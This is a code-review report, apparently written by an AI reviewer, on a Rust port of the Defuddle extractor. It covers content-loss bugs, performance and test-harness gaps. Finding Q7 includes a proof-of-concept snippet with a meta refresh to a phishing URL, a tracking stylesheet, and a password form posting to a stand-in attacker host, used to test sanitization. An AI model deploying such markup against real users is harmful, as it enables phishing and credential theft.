# Quality, safety, and harness review

Reviewer: Opus 5.5 (`claude-opus-5-5`), xhigh effort. Review only: no runtime source, tests,
contracts, Cargo files, corpus data, or TypeScript files were changed.

Baseline: Defuddle 0.19.5 at `556d74e8c8fd68c49912d4b11a4ae9ec04d7b2b5`; Rust state described by
`rust/verification.json` (170 tests, 226 pinned cases) and `rust/benchmarks/2026-10-20/`.

## Method and constraints

- **Read:** `AGENTS.md`, `rust/README.md`, `PORT_CONTRACT.md`, `QUALITY.md`, `BENCHMARKS.md`, and
  `verification.json`. Read in full: `safety.rs`, `math.rs`, `markdown.rs`, `pipeline.rs`, `dom.rs`,
  `finalize.rs`, `utils.rs`, `types.rs`, `tests/corpus.rs`, and `tests/support/quality.rs`. Read
  representative adapter code in `extractors.rs`, `conversations.rs`, `embedded.rs` (NYT, BBCode),
  `social.rs`, and `video.rs`. Read the relevant parts of `removals.rs`, `selection.rs`, and
  `standardize.rs`.
- **Tools:** `rustc` segfaults in the dynamic loader on this machine (`coredumpctl`: SIGSEGV in
  `ld-linux-x86-64.so.2`, including outside the sandbox). I could not compile new diagnostics. All Rust
  probes used the existing debug CLI `rust/target/debug/defuddle` and the debug `corpus` example. Both
  were built at 13:15–13:19, after the last `rust/src` change (13:15:01).
- **TypeScript comparison:** Used the repository's `dist/node.js` (built 11:54 from the unchanged
  source) with linkedom, `useAsync: false`, and `separateMarkdown: true`.
- **Load:** No full test or benchmark runs; probes ran at low priority. All reproductions are inline
  below. A runnable script is at `/tmp/opus-quality/repro.sh` (writes only under `/tmp`).
- **Shared `/tmp` quota:** Other agents' build directories briefly exhausted the `/tmp` quota during
  one run. Results from that run were discarded and rerun cleanly.

The architecture review (`opus-architecture.md`) independently reports the exponential Markdown
renderer (D1), a metadata date panic (D2), and structural proposals S1–S5/H1–H2. I do not repeat
those. I cross-reference D1 with a more realistic trigger, and I add quality and safety guardrails for
S1, S3, and H2.

## Verdict

On the pinned corpus, the port's extraction quality is strong:

- Prose preservation: a block-aware check finds no reference prose missing from native Markdown in
  any of the 208 non-math cases.
- Sanitization: the sanitizer held against 15 classic mutation-XSS round trips. The trips covered
  HTML reparsed by jsdom and Markdown rendered by marked.
- Overfitting: runtime code has no fixture-specific strings.
- Reviewed differences: the four I spot-checked match their stated reasons.

Several **proven defects on ordinary pages outside the corpus** lose content or availability, and the
harness cannot distinguish them from accepted changes:

1. **Q1 (P0):** the schema.org fallback picks a JSON-LD `<script>` or a `<noscript>` fallback as the
   content root and returns **empty content**. TypeScript returns the full article.
2. **Q2 (P1):** the social-profile heuristic matches any host ending in `x.com/` (dropbox.com,
   netflix.com, vox.com, …) and **deletes ordinary paragraphs**. TypeScript keeps them.
3. **Q3 (P1, = D1):** the exponential Markdown renderer is reachable through default
   `extract(markdown: true)` on common legacy markup: `<b>Label:</b>` followed by an unclosed `<font>`.
4. **Q4 (P1):** in `math--katex-data-math`, the formula source holders and the following
   `### Quadratic Formula` heading are deleted. The math contract's boilerplate reason **blesses this
   loss** with a native hash.

Hash fingerprints detect change, but they do not assert quality (Q5). The cheap assertion proposed in
Q5 would flag exactly Q4 on the current corpus.

**Release readiness:** not ready until Q1–Q4 and architecture D2 are fixed with fixtures. The rest is
hardening, contract clarity, or optional quality improvement.

## Prioritized summary

| ID | Priority | Kind | Title | Confidence |
| --- | --- | --- | --- | --- |
| Q1 | P0 | Proven defect, port divergence | Schema fallback selects `<script type=ld+json>`/`<noscript>` and returns empty content | High (repro, TS compared) |
| Q2 | P1 | Proven defect, port divergence | Social-profile substring match deletes paragraphs that link to `*x.com/` hosts | High (repro, TS compared) |
| Q3 | P1 | Proven defect (availability), = D1 | Exponential Markdown time reachable through legacy unclosed `<font>` with default options | High (measured) |
| Q4 | P1 | Proven defect, blessed by contract | `data-math` formula holders and the next heading are removed; boilerplate math reason pins the loss | High (corpus + minimal repro) |
| Q5 | P1 | Harness gap | Hashes cannot tell improvement from regression; 18 math contracts share one reason | High |
| Q6 | P2 | Proven defect (false warning) | `math_not_supported` raised for currency, `${…}`, `$VAR_NAME`, regex, and path prose | High (repro) |
| Q7 | P2 | Hardening + parity gap | `meta`/`link` are not unconditionally removed; conversation adapters keep forms and controls that TS removes | High |
| Q8 | P3 | Proven defect, Markdown only | `<code>a<br>b</code>` renders as `` `ab` `` | High (repro, TS compared) |
| Q9 | P3 | Simplification | Six different "is this math source?" predicates; one shared predicate prevents Q4-class bugs | High (by code) |
| Q10 | P3 | API contract | `html_to_markdown` drops declarative shadow content and the leading H1, and ignores the URL for links | High (by code) |
| Q11 | P3 | Latent invariant gap | Explicit unsafe-root check and selection run on different DOMs when `remove_images` is set | Medium (by code) |
| Q12 | P3 | Optional quality (TS parity) | Separator insertion splits words such as `un<b>be</b>lievable`; README word-count claim is misleading | High (repro) |
| Q13 | P4 | Style | Mid-line `\-`/`\+`/`\~` escapes in Markdown (4 corpus occurrences, 0 in TS) | High |
| M1 | P1 | Measured opportunity | One case (LessWrong) is 32.6% of the Rust corpus time and slower than TS | High (saved data) |
| M2–M5 | P2–P3 | Safe optimizations | Hoist math detection; reorder hidden check; fold schema search; cache invalid selectors | Medium–High |

---

## Q1: Schema fallback empties pages with body JSON-LD or a `<noscript>` fallback (P0)

**Kind:** proven defect (content loss); divergence from TypeScript.

**Location:**

- `rust/src/pipeline.rs:121-145` is the final schema fallback. At `:125` it calls
  `schema_element(&original, …)`, and at `:126-133` it replaces `result` unconditionally.
- `rust/src/pipeline.rs:366-380` defines `schema_element`. It searches `body *` of the
  **unsanitized** original, including `<script>`, `<noscript>`, and `<style>` text.
- `rust/src/pipeline.rs:191-204`: `attempt` returns empty content for an unsafe root.
- The same helper runs inside attempts at `rust/src/pipeline.rs:175-179`.

TypeScript first runs `_stripUnsafeElements(safeDoc.body)` and then searches
(`src/defuddle.ts:191-198`), so it can never pick these elements.

**Reproduction:** A teaser page with JSON-LD in `<body>`. Many CMSs place JSON-LD in the body.

```python
body = ' '.join('Sentence %d of the full story describes the event in careful detail for readers.' % i for i in range(14))
ld = json.dumps({"@context":"https://schema.org","@type":"NewsArticle","headline":"Story","articleBody":body})
html = ('<html><head><title>Story</title></head><body><article><h1>Story</h1><p>Sentence 0 of the full story '
        'describes the event in careful detail for readers. Subscribe to keep reading.</p></article>'
        '<script type="application/ld+json">%s</script></body></html>' % ld)
```

Variant: the JSON-LD stays in `<head>`, and the body has
`<noscript><div>{body}</div></noscript>` after the article.

| Input | Rust (`--url https://example.com/story --json`) | TypeScript |
| --- | --- | --- |
| JSON-LD in body | `wordCount 0`, `content ''` | `wordCount 196`, the full article text |
| `<noscript>` fallback | `wordCount 0`, `content ''` | `wordCount 196`, the full article text |

**Mechanism:**

1. The first attempt extracts the teaser. The schema text is more than 1.5× longer than the result.
2. `schema_element` picks the smallest element whose text contains the first 100 characters and at
   least 80% of the words. That element is the `<script>` (JSON text) or the `<noscript>` (raw text).
3. `attempt(forced = that node)` hits the unsafe-root branch and returns empty content, which replaces
   the non-empty teaser result.
4. When selection falls back to `<body>`, the in-attempt call at `:175-179` can do the same.

**Impact:** Paywall and teaser news pages, and no-JS fallback pages, produce empty output. These are
common real-world patterns.

**Suggested change:**

- Exclude candidates that are unsafe elements or descendants of unsafe elements, using
  `safety::is_unsafe_element` on the node and its ancestors. Mirroring TypeScript's search over a
  sanitized clone has the same effect.
- Defense in depth: in the schema branch, never replace a result with an unsafe-root (empty)
  candidate. Fall through to `from_html(schema)` instead.
- While there, align phrase extraction with TypeScript: split on `/\n\s*\n/`, then trim after
  `substring(0, 100)`. Rust splits on `"\n\n"` and does not trim the 100-character phrase.

Performance: the same function computes `n.text()` up to three times per element (filter and
`min_by_key`) over every `body *`. Prune top-down instead: a descendant's text is a substring of its
ancestor's text, so a subtree whose root lacks the phrase has no candidates. Preserve document-order
tie-breaking.

**Validation:**

- Add two minimal fixtures (body JSON-LD teaser; head JSON-LD with a `<noscript>` fallback) and
  confirm they fail before the fix and pass after.
- Expect the schema text, sanitized, as content.
- The 226 corpus HTML and Markdown hashes should not change.

## Q2: Social-profile detection deletes paragraphs that link to dropbox.com, netflix.com, … (P1)

**Kind:** proven defect (content loss); divergence from TypeScript.

**Location:**

- `rust/src/selection.rs:274-298` defines `has_social_profile`. It uses
  `href.split_once("x.com/")` and `contains("mastodon.")`.
- It is used at `:337`, where `likely_content` short-circuits to false, and at `:376`, where the
  score drops by 15.

TypeScript (`src/removals/scoring.ts:63`) anchors with `\b` and requires a handle character:
`/\b(…|x\.com\/(?!intent\b)\w|…|mastodon\.\w)/i`.

**Reproduction:** Six filler paragraphs, then:

```html
<div><p>Download the dataset from <a href="https://HOST/s/abc/data.zip">this archive</a> before running the second step.</p></div>
```

| HOST | Rust keeps paragraph | TS keeps paragraph |
| --- | --- | --- |
| example.org | yes | yes |
| www.dropbox.com | **no** | yes |
| www.netflix.com | **no** | yes |
| www.vox.com | **no** | — (same rule) |

**Impact:**

- Any short (<80 words) `div`/`section`/`aside` block linking to a host that ends in `x.com` is
  treated as an author bio and removed. Examples: dropbox, netflix, box, fox, vox, linux, nginx,
  wix, max.
- The same applies to links to `joinmastodon.org` and to `instagram.com/` without a handle.

**Suggested change:** Port the TypeScript pattern exactly. The `regex` crate has no lookahead, so:

- Match `(?i)(?-u:\b)(?:twitter|x)\.com/(\w+)` and reject a captured handle equal to `intent`.
  Iterate over all matches, not just the first.
- Handle `facebook.com/(\w+)` the same way, rejecting `share`.
- Keep `linkedin\.com/(in|company)/`, `instagram\.com/\w`, `threads\.net/\w`, and `mastodon\.\w`
  behind the same ASCII word boundary.

**Validation:**

- Add a table-driven unit test.
  - Positives: `x.com/user`, `twitter.com/user`, `linkedin.com/in/a`, `mastodon.social/@a`.
  - Negatives: `dropbox.com/s/x`, `netflix.com/title/1`, `x.com/intent/tweet`,
    `facebook.com/sharer`, `joinmastodon.org`.
- Corpus hashes should not change; confirm.

## Q3: The exponential Markdown renderer is reachable on realistic legacy markup (P1, = D1)

**Kind:** proven defect (availability). The cause is D1 in the architecture review
(`rust/src/markdown.rs:74-110`, the `render(next).is_empty()` probe at `:80`).

**What this adds:** A trigger through **default** extraction. Many legacy pages write
`<b>Label:</b>` followed by an unclosed `<font>`. The HTML parser nests each subsequent `<font>`. The
punctuation (`:`) suppresses standardize's separator insertion, so the sibling probe runs at every
level.

```python
body = ''.join('<b>Item %d:</b><font size=2>detail %d. ' % (i, i) for i in range(N))
# <html><body><article><h1>T</h1><p>{60 × "lorem ipsum dolor sit amet "}</p><p>{body}</p></article></body></html>
```

| N | HTML only | HTML + Markdown (debug CLI) |
| --- | --- | --- |
| 12 | 0.14 s | 0.65 s |
| 16 | 0.16 s | 5.7 s |
| 18 | 0.07 s | 14.0 s |

Growth is about 2.5–3× per item, so roughly 30 items would take hours.

**Exposure:**

- Adapter output (`from_html`) and `html_to_markdown` never run the whitespace pass, so any adjacent
  `<b>…</b><span>` nesting is enough there.
- The same output also shows a Markdown quality issue, `**Item 0:**detail`. The closing `**` is not
  right-flanking, so CommonMark shows literal asterisks. This is TypeScript parity, low priority.

**Guardrails for the fix:**

- Preserve the run semantics. Only adjacent same-kind inline siblings merge. Siblings that render
  empty and are not source blocks are skipped inside a run. `code` runs merge by raw text.
- Render each child once. Cache `children(child)` for inline-kind nodes (`render` = `delimit(inner)`)
  and the probed string for other nodes.
- Precompute "contains a native block" once per render. `source_block` (`:1015-1059`) rescans
  descendants at every level.

**Validation:**

- Keep these tests green:
  - `adjacent_code_spans_keep_their_visible_text_without_extra_backticks`
  - `adjacent_emphasis_delimiters_do_not_leak_into_visible_text`
  - `inline_marker_runs_respect_container_and_hard_break_boundaries`
  - `generated_inline_delimiters_survive_paragraph_prefix_protection`
- Corpus Markdown hashes should not change.
- Add a depth-200 regression for both triggers (`<b>x,</b><small>` nesting and unclosed `<font>`),
  with a generous time bound or a test-only render counter.

## Q4: `data-math` formula holders and the following heading are deleted; the contract blesses it (P1)

**Kind:** proven defect (content loss). The `math.json` hash pins it as accepted.

**Corpus evidence (`math--katex-data-math`):**

- Reference Markdown keeps 5 formulas and `### Quadratic Formula`.
- Native Markdown is `### Predicate Logic\n\n— For all, if is a man, then is mortal.` The formulas,
  the `Quadratic Formula` heading, and its section are gone, and the sentence no longer reads.
- `tests/data/quality/math.json` pins this with the reason shared by all 18 math cases: "…this native
  semantic snapshot protects safe source content and surrounding article prose from regression."

**Minimal reproduction (default options):**

```html
<article><h1>T</h1>{6 filler paragraphs}
<p>For all <span class="math-inline" data-math="x"><span class="katex"><span class="katex-html" aria-hidden="true"><span class="mord">x</span></span></span></span>, it holds.</p>
<h3>Quadratic Formula</h3>
<p><span class="math-block" data-math="x = \frac{-b}{2a}"><span class="katex"><span class="katex-html" aria-hidden="true"><span class="mord">x=-b/2a</span></span></span></span></p></article>
```

Rust Markdown ends with `For all, it holds.` Both formulas and the heading are gone; the warning is
present.

**Mechanism:**

1. `constants.rs:229` removes `[aria-hidden="true"]:not([class*="math"])`. The class `katex-html`
   does not contain "math", so the only visible rendering is removed. Gemini's KaTeX output has no
   `.katex-mathml` alternative.
2. `standardize.rs:543-549` deliberately keeps `data-math` ("Keep safe source attributes rather than
   stripping the only available TeX/MathML source").
3. `standardize.rs:584-601` (`remove_empty`) then deletes the now-empty holder.
4. `standardize.rs:603-610` (`meaningful`) does not treat math-source holders as content, so
   `remove_trailing_headings` (`:612`) drops the heading.
5. `markdown.rs:186-192` would render `[data-latex]` holders as raw HTML, but not `[data-math]` or
   `[data-tex]`.

**Suggested change (no conversion):** Treat `[data-math],[data-latex],[data-tex]` holders as math
source (see Q9):

- Exempt them from `remove_empty` and count them in `meaningful`.
- When a holder has no visible children, keep its source as text, for example a `<code>` child. This
  matches `math--mathjax-tex-scripts`, where `<script type="math/tex">` becomes code spans.
- Alternatively, keep the aria-hidden visual KaTeX HTML when the container has no MathML alternative.
- In Markdown, render these holders like math scripts: an inline code span, or a fenced block for
  `math-block` or display mode.

**Validation:**

- Add the minimal fixture.
- Re-pin only `math--katex-data-math`, after confirming that the heading and all 5 sources are present.
- Verify that the other 17 math hashes are unchanged.
- Add the Q5 prose gate.

## Q5: Fingerprints are regression detectors, not quality assertions (P1, harness)

**Facts:**

- `tests/corpus.rs:113-135` pins an HTML semantic hash for all 226 cases.
- `:173-189` pins 19 reviewed Markdown differences by reference and native hash.
- `:152-167` pins 18 math cases by native hash only.
- The only check on a reason is `len() > 40`.
- All 18 math reasons are the same string. I counted them: 18 occurrences, 1 distinct reason.
- `QUALITY.md` says to "fix defects before changing native fingerprints". The tooling cannot
  distinguish an improvement from a loss: re-pinning shows a reviewer only a new hash. Q4 shows the
  blind spot in practice.

**Evidence that a cheap assertion works:** I ran a block-aware word-preservation check. It renders
both Markdown outputs and checks that reference tokens are a subset of native tokens.

- Non-math cases (208): no real loss. One flagged case, `table-layout--peripheral-tables`, is a
  checker artifact: adjacent raw-HTML cells concatenate in `textContent`. I verified that the words
  are present.
- Math cases (18), with formula subtrees removed from the reference: exactly **one real loss**,
  `math--katex-data-math` (`Quadratic`, `Formula`). The other differences were code-fence artifacts
  of my regex. I verified that their words are present.

**Proposals, by value per cost:**

1. **`no_reference_prose_lost` gate** in `tests/corpus.rs`:
   - Reuse `html_semantics` to produce text with separators at block and cell boundaries.
   - For math cases, drop `math`, `script[type^=math/]`, and annotation nodes from the reference.
   - Assert that the reference token multiset minus the native multiset is empty, unless the case
     declares `allowedLoss` with a reason.
   - Today this fails on exactly Q4.
2. **Reviewable snapshots instead of opaque hashes.** Commit normalized native Markdown (or semantic
   JSON) per case, about the size of the corpus outputs. Behavior changes then appear as diffs in
   review. Keep the hashes as integrity checks if desired.
3. **Machine-checkable claims per reviewed difference.** Examples:
   `{"kind":"codeContains","text":"[](uint8_t x)"}` for Chroma, and
   `{"kind":"linkTo","hrefPrefix":"https://substackcdn.com/","count":7}` for 12 Grams. Each claim
   verifies the stated reason, not just the bytes.
4. **Case-specific math contracts** that list which source survives in each case: MathML,
   annotation, math script, image alt, or `data-*`.
5. **Metadata scope.** The corpus compares only title, author, site, published, and extractor type.
   The reference fixtures carry nothing else. Say so in `QUALITY.md`; the other fields are covered
   only by `tests/metadata.rs`.

**Additional harness gaps:**

- `safe_content` (`tests/corpus.rs:41`) does not reject `noscript`, `meta`, or `link` (see Q7), and
  does not check `srcset` candidates or `data`/`cite`/`background` URLs. The runtime sanitizer
  handles most of these; the gate should match the runtime contract.
- No test pins adapter-materialized math warnings (guardrail G2).

## Q6: Math warnings fire on ordinary prose (P2)

**Kind:** proven defect (false user-facing warning).

**Location:**

- `rust/src/math.rs:17`: `\$([^$\n]+)\$` accepts delimiters adjacent to spaces.
- `rust/src/math.rs:107-126`: backslash delimiters always count. Dollar content counts if it contains
  any of `\ _ ^ { }`, with or without a math library.

TypeScript requires tight dollar delimiters, `\$([^\s$][^$]*[^\s$]|[^\s$])\$`
(`src/elements/math.base.ts:544`). It also scans raw delimiters only when a math library is present
(`:526-540`, `:566`).

**Reproduction:** Six filler paragraphs, then one paragraph. Each line produced
`warnings=1` with no math markup or library:

```text
The plan costs $10 per user_id and $20 per team.
Set the template to ${user_name} and ${team_name} in the config.
Shell variables like $HOME_DIR and $PATH_LIST are common.
Match it with the regex \[a-z\]+ in your editor.
Use the Windows path C:\Program Files\(x86\) here.
```

**Impact:**

- Consumers see misleading warnings on technical prose.
- Any corpus or benchmark that uses detection to exclude math cases would exclude ordinary pages.
- The current 18 corpus math cases are true positives; each contains real math markup. I checked
  `issues--169-svg-classname-crash` and `security--math-literal-text`.

**Suggested change:**

- Use TypeScript's tight single-dollar rule. All existing positive tests remain positive; for
  example, `$x_{i}+1$` is tight.
- For backslash delimiters with no library present, consider requiring TeX structure for content
  with several tokens. This is a policy choice; `foundation.rs:451` currently requires `\(x\)` to warn.

Performance: the same pass eagerly lowercases every inline script (`:21-36`) and regex-scans every
text node, with an ancestor walk per text node. Compute `library_present` lazily, only for dollar
candidates without TeX structure. Use a case-insensitive regex instead of `to_ascii_lowercase()`
copies.

**Validation:**

- Add the five negatives to `math_detection_warns_once_without_conversion_or_currency_false_positives`.
- The corpus math set must remain exactly 18 cases.

## Q7: `meta`/`link` survive when cleanup is relaxed; conversation adapters keep page controls (P2)

**Kind:** hardening (sanitizer scope) and a parity gap (adapter cleanup).

**Location:**

- `rust/src/safety.rs:40-57` lists unsafe elements and does not include `meta` or `link`.
  - They are removed only by `EXACT_SELECTORS` (`constants.rs:123-124`), which depends on an option.
  - Their attributes are stripped only when `standardize` is on.
- The adapter path, `rust/src/pipeline.rs:258-294`, runs no exact-selector removal.
  `standardize::extractor` runs only when `options.standardize` is set (`:278-280`).
- TypeScript conversation extractors run a **nested full Defuddle pass** over the built HTML
  (`src/extractors/_conversation.ts:19-27`). That pass removes forms, inputs, buttons, meta, and link.

**Reproduction:** A ChatGPT share URL (`--url https://chatgpt.com/share/abc`). An assistant message
contains:

```html
<meta http-equiv="refresh" content="0;url=https://attacker.example/phish">
<link rel="stylesheet" href="https://attacker.example/track.css">
<form action="https://attacker.example/collect"><input name="password" type="password"><button>Sign in</button></form>
```

- **Rust output (default options):** `<meta>`, `<link href="https://attacker.example/track.css">`,
  `<form>`, `<input type="password">`, and `<button>`.
- **TypeScript output:** none of these.
- **With `standardize: false`** (by code reading; the CLI cannot set it), `pipeline.rs:278` skips
  attribute stripping. `http-equiv`/`content` and `rel=stylesheet` would then survive intact.

**Impact:** No script execution. But:

- The HTML spec processes `http-equiv=refresh` when the element is inserted, which allows reader-side
  navigation to an attacker URL.
- Stylesheet, preload, and prefetch links fetch external resources. TypeScript cites the same reason
  for removing SVG `<style>`.
- Conversation exports can contain fake sign-in controls.

**Suggested change:**

- Add `meta` and `link` to the unconditional unsafe list. They are never article content, so quality
  is unaffected.
- For conversation adapters, apply exact-selector clutter removal (form controls) to the built HTML,
  or reproduce TypeScript's nested pass, only for those sites.

**Validation:**

- Extend `all_optional_passes_disabled_still_sanitize_html_and_markdown` and
  `poisoned_adapter_metadata_and_raw_content_are_safe_with_cleanup_disabled` with a meta refresh and
  a stylesheet link.
- Add `meta,link` to the corpus `safe_content` forbidden list. I scanned all 226 native outputs: none
  contain button, input, form, meta, link, select, textarea, or nav beyond the reference, so the
  hashes should not change.

## Q8: `<br>` inside inline code joins tokens in Markdown (P3)

**Location:** `rust/src/markdown.rs:195` (`code_span(&node.text())`) and `:87-92` (merged code runs).

**Reproduction:** `<p>Run <code>make<br>install</code> now.</p>`

| Output | Result |
| --- | --- |
| Rust Markdown | `` Run `makeinstall` now. `` |
| TypeScript Markdown | `` Run `make   install` now. `` |
| Rust HTML | keeps `<code>make<br>install</code>` |

**Suggested change:** Collect inline code text with a walker that maps `<br>` to a newline, reusing
`pre_text`. `code_span` already maps newlines to spaces.

**Validation:** Add a unit test (this also covers `<td><code>a<br>b</code></td>`). Corpus hashes
should not change.

## Q9: One shared math-source predicate (P3, simplification motivated by Q4)

"Is this math or math source?" is decided by six different sets:

| Location | What it checks |
| --- | --- |
| `math.rs:42-85` (detection) | `math`, `mjx-*`, `role=math`, `data-math`/`latex`/`tex`/`mathml`/`katex`, math scripts, TeX annotation, many class prefixes |
| `standardize.rs:543-549` (attribute keep-list) | `data-math`/`mathml`/`tex`, `alttext`; `data-latex` via `ALLOWED_ATTRIBUTES` |
| `removals.rs:89` (hidden-removal skip) | `math,[data-mathml],.katex-mathml` |
| `constants.rs:229` (exact-selector exclusion) | `[class*="math"]` |
| `markdown.rs:186-192` (raw-HTML rule) | `math`, `.katex`, `.math`, `[data-latex]` |
| `markdown.rs:1072-1075` (inline-run exclusion) | its own set |

**Proposal:** A single `math::is_math_source(node)` and `MATH_SOURCE_SELECTOR` used by all six, with
the invariant "every math-source holder survives cleanup and renders as source". This removes a class
of bugs (Q4) without new abstractions or dependencies.

**Validation:** Corpus hashes should change only for cases that currently lose source. Review those
diffs.

## Q10: The `html_to_markdown` contract is surprising (P3)

`rust/src/markdown.rs:21-28`:

- **No preprocessing.** Declarative shadow DOM (`<template shadowrootmode>`) content is removed by
  the sanitizer as `template`, whereas `extract` hoists it (`dom.rs:295-320`).
- **Leading H1 dropped.** `:47-54` drops the first line if it starts with `# `. This matches
  TypeScript's `createMarkdownContent`, but it is surprising for a standalone public API.
- **URL scope.** `page_url` is used only to recognize embeds (`:316-321`). Relative links stay as
  authored (`:262-263`), yet `README.md:45` says the URL "supplies context for relative links".
- **Errors.** Both public functions return `Result`, but the library never constructs an `Error`
  (see architecture S2).

**Suggested change:** Call `dom::flatten_declarative_shadow_roots` before sanitizing. Document the H1
behavior or make it extraction-only. Document or implement URL resolution. Add
`#[non_exhaustive]` to `WarningCode` (`types.rs:99`) and `Error` (`types.rs:116`). More warning codes
are expected, and adding them would otherwise break downstream exhaustive matches.

Do not add `#[non_exhaustive]` to `Options` (`types.rs:6`). It would forbid the documented
`..Default::default()` construction outside the crate.

## Q11: Explicit unsafe-root check and selection use different DOMs (P3, latent)

- `rust/src/pipeline.rs:17-21` evaluates `content_selector` before `remove_images` mutates `original`
  (`:32-36`).
- `attempt` then selects on a clone in which images were removed (`:165-173`).
- With a positional selector (`:nth-child`, `+`), the check and the selection can address different
  elements.
- An explicit unsafe selection could then reach the retry and schema branches. That contradicts
  `PORT_CONTRACT.md`: "explicit unsafe selection cannot be replaced". Output stays sanitized.

**Suggested change:** Run the explicit-root check after image removal, or remove images after
selection.

**Validation:** A unit test with `remove_images: true` and
`content_selector: "body > :nth-child(2)"` that targets a `<noscript>` once a preceding `<img>` is
removed.

## Q12: Intraword separator insertion (P3, optional quality; TS parity)

`standardize.rs:735-825` inserts `" "` between adjacent inline elements unless punctuation is
involved, mirroring `src/standardize.ts:1248-1290`. Rust and TypeScript produce identical results:

| Source | Output (both) |
| --- | --- |
| `The <em>re</em>use of un<b>be</b>lievable code.` | `The *re* use of un **be** lievable code.` |
| `In <i>Hamlet</i>'s opening, the <a href=…>Python</a>s and <b>W</b>ords.` | `In *Hamlet* 's opening, the [Python](…) s and **W** ords.` |

This is not a port regression. But `README.md:50` ("preserving words split across inline elements")
and the `count_content_words` doc comment describe a property that standardized output no longer has.

**Option:** A source-backed improvement: do not insert a separator between two word characters when
both neighbors are phrasing elements (`a b strong i em u s mark small abbr q cite`). The insertion
still recovers CSS-separated spans. This changes native hashes, so treat it as a reviewed improvement
with corpus diffs. Otherwise, correct the README sentence.

## Q13: Mid-line escapes (P4, style)

`markdown.rs:782-785` escapes `# + - = ~ >` at the first content of every text node, not only at
line starts. That produces `**Name** \- description` and `Ctrl \+ C`.

- Corpus: 4 occurrences in 3 cases (`elementor--archive-page`, `general--cp4space-jordan-algebra`,
  `table-layout--single-column`); 0 in the reference.
- The output is valid CommonMark, but noisier for people reading raw Markdown (e.g., in Obsidian).

**Option:** Escape only at real line starts: after paragraph starts (already handled by
`escape_block_prefix`) and after hard breaks.

---

## Measured and safe optimization opportunities

**M1. One page dominates the corpus time (P1, measured from saved data).** In
`benchmarks/2026-10-20/rust.json`:

- `general--lesswrong.com-…` has a median of 327.45 ms in HTML mode, **32.6% of the Rust total**
  (sum of per-case medians 1003.6 ms).
- It is the only case where Rust is slower than TypeScript: 270.40 ms, 0.83×.
- The input is 149 KB, 1,884 elements, depth about 22: about 174 µs per element, far above the
  corpus norm. `general--substack-app` (343 elements, 42.6 ms) is the next outlier.

| Measure | HTML | HTML + Markdown |
| --- | --- | --- |
| Aggregate speedup, all cases | 3.88× | 4.27× |
| Aggregate speedup, without LessWrong | 5.36× | 5.94× |
| Per-case median speedup | 5.85× | 6.41× |

The architecture review's H1 (super-linear depth behavior) is a likely cause, but profile before
attributing. Any fix must keep LessWrong's reviewed semantics, which `reviewed.json` and `html.json`
pin. Consider also reporting the per-case median speedup in `BENCHMARKS.md`, because one page skews
the aggregate.

**M2. Detect math once, after adapter dispatch (P2).**

- `pipeline.rs:12` scans the original document.
- `:160-161` rescans each attempt clone whenever the original has no math. That is at least two full
  scans per non-math extraction, and up to six with retries and the schema branch.
- The rescan exists because selector adapters mutate `original`. For example, NYT appends
  `[data-defuddle-nyt]` (`embedded.rs:417-422`).
- **Change:** Compute once, immediately after `extractors::extract`, before any attempt. Keep the
  separate detection for `from_html` adapter HTML. This complements architecture S1; see G2.

**M3. Run `is_hidden` before the math-descendant query (P2, cross-ref S3).** `removals.rs:88-91`
queries every element's subtree before the cheap hidden test. Output is identical if the order is
swapped.

**M4. Schema search (P2).** Fold the pruning and single text computation into the Q1 fix.

**M5. Cache invalid selectors (P3).** `dom.rs:27` returns before caching an invalid selector. An
invalid user `content_selector` is re-parsed in every attempt (up to six). Cache a negative entry, or
validate once in `extract`.

## Guardrails for cleanup and performance proposals

These invariants must survive S1 (prepare once and finish the winner), S3/H1 (subtree work), H2
(removals scoped to root), S5 (adapter enum), and D1 (Markdown). For each: where it lives, and what
pins it today.

| ID | Invariant | Code | Pinned today | Gap / action |
| --- | --- | --- | --- | --- |
| G1 | Word counts and the hidden-retry `content.len()` comparison use **sanitized** output | `pipeline.rs:103-105`, `:244`, `:315-318` | Corpus, indirectly | If S1 defers sanitize or serialization to the winner, still sanitize (or drop unsafe elements) before counting. Compute the serialized length, or an exact equivalent, for the hidden-retry branch. With `remove_exact_selectors: false`, `<style>`/`<script>` text would otherwise inflate counts and flip retry choices. |
| G2 | Math warnings cover adapter-materialized content | `pipeline.rs:157-164`, `:269-271` | **No** | Add the NYT probe below as a test before hoisting detection. |
| G3 | Forced roots use `NodeId`s that are stable across `Document::clone` | `pipeline.rs:101`, `:132`, `:171-173` | Retry and schema tests, indirectly | If cloning changes (`clone_into`, re-parse), remap IDs or use paths. Assert that the forced root is the expected element. |
| G4 | Explicit unsafe root is decided before retagging and never replaced | `pipeline.rs:17-31`, `:191-204` | `pipeline_review.rs:42`, `:65` | Fix the ordering first (Q11). |
| G5 | Inline-run merging semantics in Markdown | `markdown.rs:74-110` | Four tests listed in Q3 | Add deep-nesting regressions. |
| G6 | Removals outside the root do not affect output, and `debug.removals` matches TypeScript's scope | `pipeline.rs:215-229` | Debug test, corpus | H2 changes debug output. Footnote and callout standardization runs before removals (`:212-214`); keep that order. |
| G7 | The final sanitize after standardize and URL resolution in `from_html` | `pipeline.rs:272`, `:282` | Adapter poisoned-attribute tests | Do not drop the second pass as "redundant": retagging and URL rewriting happen between the passes. |
| G8 | Adapter HTML serializes `inner`; DOM roots serialize `outer` | `pipeline.rs:308-314` | Corpus | Preserve this in S5's enum. |
| G9 | Retry thresholds and comparisons (<200 ×2, <50 ×2, hidden `>` or `>max(20, 0.7×)` with shorter content, index `>`, schema ×1.5) | `pipeline.rs:69-145` | Corpus | Any reduction in attempts must reproduce the same winner on all 226 cases. |

**Guardrail probe for G2** (it passes today, and should stay passing):

- Input: an NYT URL whose `window.__preloadedData` JSON includes the paragraph text
  `"The estimator is $\\hat{\\theta}_{n} = x_{i}+1$ …"`.
- Expected: `extractorType "nytimes"` and exactly one `math_not_supported` warning.
- Without the paragraph: no warning.
- The TeX in the original appears only inside `<script>`, which detection skips, so only the
  materialized DOM can raise the warning.

## Categories with no actionable finding

- **Mutation XSS / sanitizer round trips.** I tested 15 payloads: MathML/SVG namespace confusion
  (`mglyph`/`style`), `noembed`/`xmp` raw text, `xlink:href` on SVG `a` and `maction`, a `data:`
  iframe, `template`, `base`, `object`/`embed`, `formaction`, and an entity-encoded `javascript:`.
  - The Rust HTML output, reparsed by jsdom, had no active elements, `on*` attributes, `srcdoc`, or
    `javascript:` URLs.
  - The Rust Markdown, rendered by marked and parsed by jsdom, was equally clean.
- **Markdown destination, title, and alt escaping.**
  - Entities are not double-decoded: literal `&amp;amp;` round-trips correctly, whereas TypeScript
    loses one layer.
  - Doubled backslashes prevent `\:` scheme tricks.
